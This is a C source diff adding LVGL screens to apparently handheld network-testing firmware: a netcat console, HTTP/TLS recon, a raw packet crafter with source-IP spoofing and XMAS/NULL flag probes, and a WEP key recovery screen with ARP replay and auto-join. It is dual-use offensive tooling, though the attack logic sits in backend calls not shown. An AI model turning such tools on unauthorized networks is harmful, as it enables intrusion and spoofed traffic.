+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_ncsend_ta = ta;
+    nt_action_btn(scr, "Send", nt_ncsend_go, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_TEXT);
+    return scr;
+}
+static void nt_ncc_send_cb(lv_event_t *e)  { (void)e; nocsif_nav_push(build_nt_nc_send()); }
+static void nt_ncc_close_cb(lv_event_t *e) { (void)e; nocsif_nettools_nc_close(); nocsif_nav_back(); }
+static void nt_ncc_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ncc_status) lv_label_set_text(s_ncc_status, nocsif_nettools_nc_status());
+    uint32_t g = nocsif_nettools_nc_gen();
+    if (g != s_ncc_gen_seen && s_ncc_body) {
+        s_ncc_gen_seen = g;
+        static char rx[1600];
+        nocsif_nettools_nc_rx(rx, sizeof rx);
+        lv_label_set_text(s_ncc_body, rx);
+        if (s_ncc_scroll) lv_obj_scroll_to_y(s_ncc_scroll, 100000, LV_ANIM_OFF);   /* stick to the bottom */
+    }
+}
+static void nt_ncc_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    nocsif_nettools_nc_close();   /* leaving the console ends the session */
+    s_ncc_status = s_ncc_body = s_ncc_scroll = NULL;
+}
+static lv_obj_t *build_nt_nc_console(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Netcat", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 20, 0);
+
+    s_ncc_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ncc_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ncc_status, lv_pct(100));
+    lv_obj_add_style(s_ncc_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ncc_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_ncc_status, nocsif_nettools_nc_status());
+
+    lv_obj_t *acts = lv_obj_create(content);
+    lv_obj_remove_style_all(acts);
+    lv_obj_set_width(acts, lv_pct(100));
+    lv_obj_set_height(acts, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(acts, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(acts, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(acts, 8, 0);
+    lv_obj_set_style_pad_ver(acts, 6, 0);
+    lv_obj_clear_flag(acts, LV_OBJ_FLAG_SCROLLABLE);
+    (void) nt_btn(acts, "Type & send", nt_ncc_send_cb);
+    (void) nt_btn(acts, "Close",       nt_ncc_close_cb);
+
+    /* Fixed-height, self-scrolling transcript box so the buttons above stay put. */
+    lv_obj_t *box = lv_obj_create(content);
+    lv_obj_remove_style_all(box);
+    lv_obj_set_width(box, lv_pct(100));
+    lv_obj_set_height(box, 240);
+    lv_obj_set_style_bg_color(box, NOCSIF_PIT, 0);
+    lv_obj_set_style_bg_opa(box, LV_OPA_COVER, 0);
+    lv_obj_set_style_radius(box, 6, 0);
+    lv_obj_set_style_pad_all(box, 8, 0);
+    lv_obj_set_style_margin_top(box, 6, 0);
+    lv_obj_add_flag(box, LV_OBJ_FLAG_SCROLLABLE);
+    s_ncc_scroll = box;
+
+    s_ncc_body = lv_label_create(box);
+    lv_label_set_long_mode(s_ncc_body, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ncc_body, lv_pct(100));
+    lv_obj_add_style(s_ncc_body, &nocsif_style_font_tag, 0);   /* transcript scales with the type scale */
+    lv_obj_set_style_text_color(s_ncc_body, NOCSIF_BONE, 0);
+    lv_label_set_text(s_ncc_body, "");
+
+    s_ncc_gen_seen = nocsif_nettools_nc_gen() - 1;
+
+    lv_timer_t *timer = lv_timer_create(nt_ncc_tick, 250, NULL);
+    lv_obj_add_event_cb(scr, nt_ncc_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- shared report view (HTTP recon / packet crafter) ---- */
+static const char *s_rep_title = "Report";
+static lv_obj_t *s_ntr_status, *s_ntr_bar, *s_ntr_list;
+static uint32_t  s_ntr_gen_seen;
+
+static void nt_rep_fill(void)
+{
+    if (!s_ntr_list) return;
+    lv_obj_clean(s_ntr_list);
+    int n = nocsif_nettools_rep_count();
+    if (n == 0) {
+        lv_obj_t *e = lv_label_create(s_ntr_list);
+        lv_label_set_text(e, nocsif_nettools_busy() ? "working…" : "no output");
+        lv_obj_add_style(e, &nocsif_style_font_caption, 0);
+        lv_obj_set_style_text_color(e, NOCSIF_ASH, 0);
+        return;
+    }
+    for (int i = 0; i < n; i++) {
+        char rec[NOCSIF_NT_REP_REC];
+        if (!nocsif_nettools_rep_get(i, rec, sizeof rec)) continue;
+        nt_line_row(s_ntr_list, rec, NOCSIF_BONE);
+    }
+}
+static void nt_rep_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_ntr_status) lv_label_set_text(s_ntr_status, nocsif_nettools_status_str());
+    if (s_ntr_bar)    lv_bar_set_value(s_ntr_bar, nocsif_nettools_progress(), LV_ANIM_OFF);
+    uint32_t g = nocsif_nettools_gen();
+    if (g != s_ntr_gen_seen) { s_ntr_gen_seen = g; nt_rep_fill(); }
+}
+static void nt_rep_deleted_cb(lv_event_t *e)
+{
+    lv_timer_t *t = (lv_timer_t *)lv_event_get_user_data(e);
+    if (t) lv_timer_delete(t);
+    s_ntr_status = s_ntr_bar = s_ntr_list = NULL;
+}
+static lv_obj_t *build_nt_report(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(s_rep_title, NULL, &content);
+    lv_obj_set_style_pad_hor(content, 22, 0);
+
+    s_ntr_status = lv_label_create(content);
+    lv_label_set_long_mode(s_ntr_status, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(s_ntr_status, lv_pct(100));
+    lv_obj_add_style(s_ntr_status, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(s_ntr_status, NOCSIF_STEEL, 0);
+    lv_label_set_text(s_ntr_status, nocsif_nettools_status_str());
+
+    s_ntr_bar = nt_progress_bar(content);
+
+    s_ntr_list = lv_obj_create(content);
+    lv_obj_remove_style_all(s_ntr_list);
+    lv_obj_set_width(s_ntr_list, lv_pct(100));
+    lv_obj_set_height(s_ntr_list, LV_SIZE_CONTENT);
+    lv_obj_set_flex_flow(s_ntr_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_clear_flag(s_ntr_list, LV_OBJ_FLAG_SCROLLABLE);
+    lv_obj_set_style_pad_top(s_ntr_list, 8, 0);
+
+    s_ntr_gen_seen = nocsif_nettools_gen() - 1;
+    nt_rep_fill();
+
+    lv_timer_t *timer = lv_timer_create(nt_rep_tick, 400, NULL);
+    lv_obj_add_event_cb(scr, nt_rep_deleted_cb, LV_EVENT_DELETE, timer);
+    return scr;
+}
+
+/* ---- shared numeric edit (HTTP port / craft target IP / craft port) ---- */
+enum { NE_HTTP_PORT = 0, NE_CRAFT_IP, NE_CRAFT_PORT, NE_CRAFT_SRC };
+static uint8_t   s_ne_field;
+static lv_obj_t *s_ne_ta;
+/* HTTP-recon + crafter state (declared here so the shared edit can update their row labels). */
+static char      s_http_host[128];
+static uint16_t  s_http_port = 80;
+static bool      s_http_tls;
+static lv_obj_t *s_http_host_lbl, *s_http_port_lbl, *s_http_tls_lbl;
+static uint32_t  s_craft_ip;
+static char      s_craft_ipstr[16];
+static uint32_t  s_craft_src;       /* spoofed source IP, 0 = auto (our own link IP) */
+static char      s_craft_srcstr[16];
+static uint8_t   s_craft_mode;      /* 0 ICMP · 1 TCP · 2 UDP */
+static uint16_t  s_craft_port = 80;
+static uint8_t   s_craft_sel;       /* preset index within the mode */
+static uint8_t   s_craft_ci;        /* count-preset index */
+static lv_obj_t *s_craft_ip_lbl, *s_craft_src_lbl, *s_craft_mode_lbl, *s_craft_port_lbl, *s_craft_flag_lbl, *s_craft_count_lbl;
+
+static void nt_ne_go(lv_event_t *e)
+{
+    (void)e;
+    if (!s_ne_ta) return;
+    const char *txt = lv_textarea_get_text(s_ne_ta);
+    if (s_ne_field == NE_CRAFT_IP) {
+        uint32_t ip;
+        if (!nocsif_nettools_parse_ip(txt, &ip)) { nocsif_toast("Enter a valid IPv4 address"); return; }
+        s_craft_ip = ip; snprintf(s_craft_ipstr, sizeof s_craft_ipstr, "%s", txt);
+        if (s_craft_ip_lbl) lv_label_set_text(s_craft_ip_lbl, s_craft_ipstr);
+    } else if (s_ne_field == NE_CRAFT_SRC) {
+        if (!txt || !txt[0]) {                       /* cleared = auto (our own link IP) */
+            s_craft_src = 0; s_craft_srcstr[0] = '\0';
+        } else {
+            uint32_t ip;
+            if (!nocsif_nettools_parse_ip(txt, &ip)) { nocsif_toast("Enter a valid IPv4 (or clear for auto)"); return; }
+            s_craft_src = ip; snprintf(s_craft_srcstr, sizeof s_craft_srcstr, "%s", txt);
+        }
+        if (s_craft_src_lbl) lv_label_set_text(s_craft_src_lbl, s_craft_src ? s_craft_srcstr : "auto");
+    } else {
+        int p = atoi(txt);
+        if (p < 1 || p > 65535) { nocsif_toast("Port must be 1-65535"); return; }
+        char b[8]; snprintf(b, sizeof b, "%d", p);
+        if (s_ne_field == NE_HTTP_PORT) { s_http_port = (uint16_t)p;  if (s_http_port_lbl)  lv_label_set_text(s_http_port_lbl, b); }
+        else                           { s_craft_port = (uint16_t)p; if (s_craft_port_lbl) lv_label_set_text(s_craft_port_lbl, b); }
+    }
+    nocsif_nav_back();
+}
+static lv_obj_t *build_nt_numedit(void)
+{
+    bool src = (s_ne_field == NE_CRAFT_SRC);
+    bool ip  = (s_ne_field == NE_CRAFT_IP) || src;
+    const char *title = src ? "Source IP" : (s_ne_field == NE_CRAFT_IP) ? "Target" : "Port";
+    const char *hintx = src ? "Source IPv4 " NOCSIF_DOT " clear = auto (spoof)"
+                       : (s_ne_field == NE_CRAFT_IP) ? "Target host (IPv4)" : "Port (1-65535)";
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold(title, NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, hintx);
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_accepted_chars(ta, ip ? "0123456789." : "0123456789");
+    lv_textarea_set_max_length(ta, ip ? 15 : 5);
+    char seed[16];
+    if (src) snprintf(seed, sizeof seed, "%s", s_craft_srcstr);
+    else if (s_ne_field == NE_CRAFT_IP) snprintf(seed, sizeof seed, "%s", s_craft_ipstr[0] ? s_craft_ipstr : "");
+    else if (s_ne_field == NE_HTTP_PORT) snprintf(seed, sizeof seed, "%u", s_http_port);
+    else snprintf(seed, sizeof seed, "%u", s_craft_port);
+    lv_textarea_set_text(ta, seed);
+    lv_obj_set_width(ta, lv_pct(100));
+    nocsif_label_font_scaled(ta, &nocsif_mono_18);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_ne_ta = ta;
+    nt_action_btn(scr, "Set", nt_ne_go, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_NUMERIC);
+    return scr;
+}
+
+/* ---- HTTP + TLS recon ---- */
+static lv_obj_t *s_httph_ta;
+static void nt_httph_go(lv_event_t *e)
+{
+    (void)e;
+    if (s_httph_ta) {
+        snprintf(s_http_host, sizeof s_http_host, "%s", lv_textarea_get_text(s_httph_ta));
+        if (s_http_host_lbl) lv_label_set_text(s_http_host_lbl, s_http_host[0] ? s_http_host : "tap to set");
+    }
+    nocsif_nav_back();
+}
+static lv_obj_t *build_nt_httphost(void)
+{
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Host", NULL, &content);
+    lv_obj_set_style_pad_hor(content, 26, 0);
+    lv_obj_t *hint = lv_label_create(content);
+    lv_label_set_text(hint, "Host or IP (name is resolved)");
+    lv_obj_add_style(hint, &nocsif_style_font_caption, 0);
+    lv_obj_set_style_text_color(hint, NOCSIF_STEEL, 0);
+    lv_obj_t *ta = lv_textarea_create(content);
+    lv_textarea_set_one_line(ta, true);
+    lv_textarea_set_accepted_chars(ta, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-");
+    lv_textarea_set_max_length(ta, 120);
+    lv_textarea_set_text(ta, s_http_host);
+    lv_obj_set_width(ta, lv_pct(100));
+    nocsif_label_font_scaled(ta, &nocsif_mono_16);
+    lv_obj_set_style_bg_color(ta, NOCSIF_PIT, 0);
+    lv_obj_set_style_text_color(ta, NOCSIF_WHITE, 0);
+    lv_obj_set_style_border_color(ta, NOCSIF_EDGE2, 0);
+    lv_obj_set_style_border_width(ta, 1, 0);
+    s_httph_ta = ta;
+    nt_action_btn(scr, "Set", nt_httph_go, NULL);
+    nocsif_kb_attach(scr, ta, NOCSIF_KB_URL);
+    return scr;
+}
+static void nt_http_host_cb(lv_event_t *e) { (void)e; nocsif_nav_push(build_nt_httphost()); }
+static void nt_http_port_cb(lv_event_t *e) { (void)e; s_ne_field = NE_HTTP_PORT; nocsif_nav_push(build_nt_numedit()); }
+static void nt_http_tls_cb(lv_event_t *e)
+{
+    (void)e;
+    s_http_tls = !s_http_tls;
+    if (s_http_tls && s_http_port == 80) s_http_port = 443;
+    else if (!s_http_tls && s_http_port == 443) s_http_port = 80;
+    if (s_http_tls_lbl)  lv_label_set_text(s_http_tls_lbl, s_http_tls ? "on" : "off");
+    if (s_http_port_lbl) { char b[8]; snprintf(b, sizeof b, "%u", s_http_port); lv_label_set_text(s_http_port_lbl, b); }
+}
+static void nt_http_run_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!s_http_host[0]) { nocsif_toast("Set a host first"); return; }
+    nocsif_nettools_request_http(s_http_host, s_http_port, s_http_tls);
+    s_rep_title = "HTTP Recon";
+    nocsif_nav_push(build_nt_report());
+}
+static void nt_http_deleted_cb(lv_event_t *e) { (void)e; s_http_host_lbl = s_http_port_lbl = s_http_tls_lbl = NULL; }
+static lv_obj_t *build_nt_http(void)
+{
+    if (!s_http_host[0] && s_nt_target) nocsif_nettools_ip_str(s_nt_target, s_http_host, sizeof s_http_host);
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("HTTP Recon", "headers " NOCSIF_DOT " methods " NOCSIF_DOT " TLS cert", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    lv_obj_t *hacc = NULL;
+    wifi_menu_row(list, "Host", NOCSIF_BONE, s_http_host[0] ? s_http_host : "tap to set", &hacc, nt_http_host_cb, NULL);
+    s_http_host_lbl = hacc;
+    char ps[8]; snprintf(ps, sizeof ps, "%u", s_http_port);
+    lv_obj_t *pacc = NULL;
+    wifi_menu_row(list, "Port", NOCSIF_BONE, ps, &pacc, nt_http_port_cb, NULL);
+    s_http_port_lbl = pacc;
+    lv_obj_t *tacc = NULL;
+    wifi_menu_row(list, "TLS", NOCSIF_BONE, s_http_tls ? "on" : "off", &tacc, nt_http_tls_cb, NULL);
+    s_http_tls_lbl = tacc;
+    wifi_menu_row(list, "Run", NOCSIF_VIOLET, ">", NULL, nt_http_run_cb, NULL);
+
+    lv_obj_t *note = lv_label_create(list);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_text(note, "HEAD + OPTIONS for the status line, server, and allowed methods. With TLS on, also grabs the certificate (subject, issuer, validity, SANs) without verifying it.");
+    lv_obj_add_style(note, &nocsif_style_font_tag_small, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(note, 12, 0);
+
+    lv_obj_add_event_cb(scr, nt_http_deleted_cb, LV_EVENT_DELETE, NULL);
+    return scr;
+}
+
+/* ---- packet crafter ---- */
+static const struct { const char *nm; uint8_t v; } k_tcp_flags[] = {
+    {"SYN", 0x02}, {"ACK", 0x10}, {"FIN", 0x01}, {"NULL", 0x00}, {"XMAS", 0x29}, {"SYN-ACK", 0x12}, {"RST", 0x04},
+};
+static const struct { const char *nm; uint8_t v; } k_icmp_types[] = {
+    {"echo", 8}, {"timestamp", 13}, {"info", 15}, {"mask", 17},
+};
+static const int k_craft_counts[] = { 1, 3, 5, 10, 16 };
+
+static const char *craft_mode_name(void) { return s_craft_mode == 1 ? "TCP" : s_craft_mode == 2 ? "UDP" : "ICMP"; }
+static int craft_flag_max(void)  { return s_craft_mode == 1 ? NT_N(k_tcp_flags) : s_craft_mode == 0 ? NT_N(k_icmp_types) : 1; }
+static const char *craft_flag_name(void)
+{
+    if (s_craft_mode == 1) return k_tcp_flags[s_craft_sel % NT_N(k_tcp_flags)].nm;
+    if (s_craft_mode == 0) return k_icmp_types[s_craft_sel % NT_N(k_icmp_types)].nm;
+    return "-";
+}
+static uint8_t craft_flag_byte(void)
+{
+    if (s_craft_mode == 1) return k_tcp_flags[s_craft_sel % NT_N(k_tcp_flags)].v;
+    if (s_craft_mode == 0) return k_icmp_types[s_craft_sel % NT_N(k_icmp_types)].v;
+    return 0;
+}
+static void nt_craft_target_cb(lv_event_t *e) { (void)e; s_ne_field = NE_CRAFT_IP; nocsif_nav_push(build_nt_numedit()); }
+static void nt_craft_src_cb(lv_event_t *e)    { (void)e; s_ne_field = NE_CRAFT_SRC; nocsif_nav_push(build_nt_numedit()); }
+static void nt_craft_port_cb(lv_event_t *e)   { (void)e; s_ne_field = NE_CRAFT_PORT; nocsif_nav_push(build_nt_numedit()); }
+static void nt_craft_mode_cb(lv_event_t *e)
+{
+    (void)e;
+    s_craft_mode = (s_craft_mode + 1) % 3; s_craft_sel = 0;
+    if (s_craft_mode_lbl) lv_label_set_text(s_craft_mode_lbl, craft_mode_name());
+    if (s_craft_flag_lbl) lv_label_set_text(s_craft_flag_lbl, craft_flag_name());
+}
+static void nt_craft_flag_cb(lv_event_t *e)
+{
+    (void)e;
+    s_craft_sel = (s_craft_sel + 1) % craft_flag_max();
+    if (s_craft_flag_lbl) lv_label_set_text(s_craft_flag_lbl, craft_flag_name());
+}
+static void nt_craft_count_cb(lv_event_t *e)
+{
+    (void)e;
+    s_craft_ci = (s_craft_ci + 1) % NT_N(k_craft_counts);
+    if (s_craft_count_lbl) { char b[8]; snprintf(b, sizeof b, "%d", k_craft_counts[s_craft_ci]); lv_label_set_text(s_craft_count_lbl, b); }
+}
+static void nt_craft_send_cb(lv_event_t *e)
+{
+    (void)e;
+    if (!s_craft_ip) { nocsif_toast("Set a target first"); return; }
+    nocsif_nettools_request_craft(s_craft_ip, s_craft_src, s_craft_mode, s_craft_port, craft_flag_byte(), k_craft_counts[s_craft_ci], NULL);
+    s_rep_title = "Packet Crafter";
+    nocsif_nav_push(build_nt_report());
+}
+static void nt_craft_deleted_cb(lv_event_t *e)
+{
+    (void)e;
+    s_craft_ip_lbl = s_craft_src_lbl = s_craft_mode_lbl = s_craft_port_lbl = s_craft_flag_lbl = s_craft_count_lbl = NULL;
+}
+static lv_obj_t *build_nt_craft(void)
+{
+    if (!s_craft_ip && s_nt_target) { s_craft_ip = s_nt_target; nocsif_nettools_ip_str(s_nt_target, s_craft_ipstr, sizeof s_craft_ipstr); }
+    lv_obj_t *content;
+    lv_obj_t *scr = nocsif_screen_scaffold("Packet Crafter", "ICMP / TCP / UDP", &content);
+    lv_obj_t *list = nocsif_menu_list(content);
+
+    lv_obj_t *iacc = NULL;
+    wifi_menu_row(list, "Target", NOCSIF_BONE, s_craft_ipstr[0] ? s_craft_ipstr : "tap to set", &iacc, nt_craft_target_cb, NULL);
+    s_craft_ip_lbl = iacc;
+    lv_obj_t *sacc = NULL;
+    wifi_menu_row(list, "Source IP", NOCSIF_BONE, s_craft_src ? s_craft_srcstr : "auto", &sacc, nt_craft_src_cb, NULL);
+    s_craft_src_lbl = sacc;
+    lv_obj_t *macc = NULL;
+    wifi_menu_row(list, "Mode", NOCSIF_BONE, craft_mode_name(), &macc, nt_craft_mode_cb, NULL);
+    s_craft_mode_lbl = macc;
+    char ps[8]; snprintf(ps, sizeof ps, "%u", s_craft_port);
+    lv_obj_t *pacc = NULL;
+    wifi_menu_row(list, "Port", NOCSIF_BONE, ps, &pacc, nt_craft_port_cb, NULL);
+    s_craft_port_lbl = pacc;
+    lv_obj_t *facc = NULL;
+    wifi_menu_row(list, "Flags / type", NOCSIF_BONE, craft_flag_name(), &facc, nt_craft_flag_cb, NULL);
+    s_craft_flag_lbl = facc;
+    char cs[8]; snprintf(cs, sizeof cs, "%d", k_craft_counts[s_craft_ci]);
+    lv_obj_t *cacc = NULL;
+    wifi_menu_row(list, "Count", NOCSIF_BONE, cs, &cacc, nt_craft_count_cb, NULL);
+    s_craft_count_lbl = cacc;
+    wifi_menu_row(list, "Send", NOCSIF_VIOLET, ">", NULL, nt_craft_send_cb, NULL);
+
+    lv_obj_t *note = lv_label_create(list);
+    lv_label_set_long_mode(note, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(note, lv_pct(100));
+    lv_label_set_text(note, "Builds and sends raw probes. Source IP 'auto' uses your own address and reads replies; set a custom Source IP to spoof the packet (fire-and-forget — replies go to that address). TCP flag probes read SYN-ACK = open / RST = closed. Authorized testing only.");
+    lv_obj_add_style(note, &nocsif_style_font_tag_small, 0);
+    lv_obj_set_style_text_color(note, NOCSIF_ASH, 0);
+    lv_obj_set_style_pad_top(note, 12, 0);
+
+    lv_obj_add_event_cb(scr, nt_craft_deleted_cb, LV_EVENT_DELETE, NULL);
+    return scr;
+}
+
 static void wifi_pcap_deleted_cb(lv_event_t *e)
 {
     lv_timer_t *timer = (lv_timer_t *)lv_event_get_user_data(e);
     if (timer) {
         lv_timer_delete(timer);
     }
-    /* Capture keeps running in the background, like Monitor; only the screen's own widgets get nulled. */
+    /* Capture keeps running in the background (like Monitor); only nulling the screen widgets. */
     s_pcap_status = s_pcap_file = s_pcap_stats = s_pcap_start_lbl = s_pcap_stream_lbl = NULL;
 }
 
@@ -5271,7 +7579,7 @@ static lv_obj_t *build_wifi_pcap(void)
     nocsif_wifi_init();
     lv_obj_t *content;
     lv_obj_t *scr = nocsif_screen_scaffold("Record All Traffic", NULL, &content);
-    lv_obj_set_style_pad_hor(content, 26, 0);   /* a corner-safe inset */
+    lv_obj_set_style_pad_hor(content, 26, 0);   /* corner-safe inset */
     lv_obj_clear_flag(content, LV_OBJ_FLAG_SCROLL_ELASTIC | LV_OBJ_FLAG_SCROLL_MOMENTUM);
 
     s_pcap_status = lv_label_create(content);
@@ -5318,7 +7626,7 @@ static lv_obj_t *build_wifi_pcap(void)
 
     lv_timer_t *timer = lv_timer_create(wifi_pcap_tick, 500, NULL);
     lv_obj_add_event_cb(scr, wifi_pcap_deleted_cb, LV_EVENT_DELETE, timer);
-    wifi_pcap_tick(timer);   /* seeded immediately */
+    wifi_pcap_tick(timer);   /* seed immediately */
     return scr;
 }
 
@@ -5329,7 +7637,7 @@ static lv_obj_t *build_wifi_pcap(void)
  * never solicits one. */
 static live_row_t *s_hs;   /* PSRAM pool (LIVE_ROWS) — ui_live_pools_init */
 static lv_obj_t  *s_hs_status, *s_hs_start_lbl, *s_hs_rec_lbl, *s_hs_recinfo, *s_hs_more, *s_hs_more_lbl;
-static lv_obj_t  *s_hs_hclbl;   /* the hc22000 export status */
+static lv_obj_t  *s_hs_hclbl;   /* hc22000 export status */
 static int        s_hs_page;
 
 static void wifi_hs_row_fill(live_row_t *r, const nocsif_wifi_mon_hs_t *hs)
@@ -5569,18 +7877,191 @@ static lv_obj_t *build_wifi_handshake(void)
     lv_obj_add_style(s_hs_more_lbl, &nocsif_style_font_caption, 0);
     lv_obj_set_style_text_color(s_hs_more_lbl, NOCSIF_VIOLET, 0);
     lv_obj_set_width(s_hs_more_lbl, lv_pct(100));
-    lv_obj_set_style_text_align(s_hs_more_lbl, LV_TEXT_ALIGN_CENTER, 0);   /* ends stay clear of the corners */
+    lv_obj_set_style_text_align(s_hs_more_lbl, LV_TEXT_ALIGN_CENTER, 0);   /* ends clear of corners */
     lv_label_set_text(s_hs_more_lbl, "");
 
     if (s_hs_target.valid) {
-        nocsif_wifi_request_parse(true);            /* targeted from Live Networks: capture starts channel-locked */
+        nocsif_wifi_request_parse(true);            /* targeted from Live Networks: capture + channel-lock */
         nocsif_wifi_request_monitor_channel(s_hs_target.channel);
     } else if (nocsif_wifi_monitor_active() && !nocsif_wifi_parse_active()) {
-        nocsif_wifi_request_parse(true);            /* arriving from Monitor lights up the parser */
+        nocsif_wifi_request_parse(true);            /* arrived from Monitor: light up the parser */
     }
     lv_timer_t *timer = lv_timer_create(wifi_hs_tick, 1000, NULL);
     lv_obj_add_event_cb(scr, wifi_hs_deleted_cb, LV_EVENT_DELETE, timer);
-    wifi_hs_tick(timer);   /* seeded immediately */
+    wifi_hs_tick(timer);   /* seed immediately */
+    return scr;
+}
+
+/* ---- WEP key recovery screen (#4, channel-locked to the tapped AP) ------------------- *
+ * Drives the wifi.c recovery worker (nocsif_wifi_request_wep_recover + the wep_* getters): a live
+ * "collecting N IVs (P%)" readout with Start/Stop, an ARP-replay toggle, and a key-length toggle;
+ * on success it reveals the recovered key and a Join row. Recovery keeps running in the background
+ * if you leave (it takes minutes on a real AP); any other radio action, or Join, stops it. */
+static lv_obj_t *s_wep_status, *s_wep_info, *s_wep_start_lbl, *s_wep_replay_lbl, *s_wep_len_lbl;
+static lv_obj_t *s_wep_keycard, *s_wep_keyval, *s_wep_keyascii, *s_wep_join_lbl;
+
+static const char *wep_len_label(int kl)
+{
+    return kl == 5 ? "64-bit (40)" : kl == 13 ? "128-bit (104)" : "auto";
+}
+
+static void wifi_wep_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (nocsif_wifi_wep_state() == NOCSIF_WEP_COLLECTING) {
+        nocsif_wifi_request_wep_recover(NULL, 0, 0, NULL, false);        /* stop + restore the link */
+    } else {
+        nocsif_wifi_request_wep_recover(s_wep_target.bssid, s_wep_target.channel,
+                                        s_wep_ui_keylen, s_wep_ssid_ui, true);
+    }
+}
+
+static void wifi_wep_replay_cb(lv_event_t *e)
+{
+    (void)e;
+    nocsif_wifi_wep_set_replay(!nocsif_wifi_wep_replay());
+}
+
+static void wifi_wep_len_cb(lv_event_t *e)
+{
+    (void)e;
+    if (nocsif_wifi_wep_state() == NOCSIF_WEP_COLLECTING) {
+        nocsif_toast("Stop first to change the key length");
+        return;
+    }
+    s_wep_ui_keylen = (s_wep_ui_keylen == 0) ? 5 : (s_wep_ui_keylen == 5 ? 13 : 0);
+    if (s_wep_len_lbl) wifi_set_label(s_wep_len_lbl, wep_len_label(s_wep_ui_keylen));
+}
+
+static void wifi_wep_join_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_wep_ssid_ui[0] == '\0') { nocsif_toast("Hidden SSID — join from the network list"); return; }
+    const char *k = nocsif_wifi_wep_key_ascii();
+    if (k[0] == '\0') {
+        nocsif_toast("Hex key — enter it manually via the network list");
+        return;
+    }
+    nocsif_wifi_request_connect(s_wep_ssid_ui, k);   /* a join tears down capture (single radio) */
+    nocsif_nav_push(build_wifi_connecting());
+}
+
+static void wifi_wep_tick(lv_timer_t *t)
+{
+    (void)t;
+    if (s_wep_status == NULL) return;
+    nocsif_wep_state_t st = nocsif_wifi_wep_state();
+    bool collecting = (st == NOCSIF_WEP_COLLECTING);
+    bool got        = (st == NOCSIF_WEP_RECOVERED);
+
+    char buf[112];
+    snprintf(buf, sizeof buf, "%s " NOCSIF_DOT " ch %d\n%s",
+             s_wep_target.name, s_wep_target.channel, nocsif_wifi_wep_status_str());
+    wifi_set_label(s_wep_status, buf);
+    lv_obj_set_style_text_color(s_wep_status, got ? NOCSIF_WHITE : (collecting ? NOCSIF_VIOLET : NOCSIF_STEEL), 0);
+
+    snprintf(buf, sizeof buf, "%u data frames " NOCSIF_DOT " %u replays " NOCSIF_DOT " %u IVs%s",
+             (unsigned)nocsif_wifi_wep_data_frames(), (unsigned)nocsif_wifi_wep_replays(),
+             (unsigned)nocsif_wifi_wep_unique_ivs(),
+             (collecting && !nocsif_wifi_wep_has_arp()) ? " " NOCSIF_DOT " waiting for an ARP frame" : "");
+    wifi_set_label(s_wep_info, buf);
+
+    if (s_wep_start_lbl)  wifi_set_label(s_wep_start_lbl, collecting ? "Stop" : (got ? "Run again" : "Start recovery"));
+    if (s_wep_replay_lbl) wifi_set_label(s_wep_replay_lbl, nocsif_wifi_wep_replay() ? "ARP replay: on" : "ARP replay: off");
+    if (s_wep_len_lbl)    wifi_set_label(s_wep_len_lbl, wep_len_label(s_wep_ui_keylen));
+
+    if (got && s_wep_keycard) {
+        lv_obj_clear_flag(s_wep_keycard, LV_OBJ_FLAG_HIDDEN);
+        if (s_wep_keyval)   wifi_set_label(s_wep_keyval, nocsif_wifi_wep_key_hex());
+        if (s_wep_keyascii) {
+            const char *a = nocsif_wifi_wep_key_ascii();
+            char ab[48];
+            snprintf(ab, sizeof ab, a[0] ? "text: %s" : "(non-text key — use the hex above)", a);
+            wifi_set_label(s_wep_keyascii, ab);
+        }
+    } else if (s_wep_keycard) {
+        lv_obj_add_flag(s_wep_keycard, LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
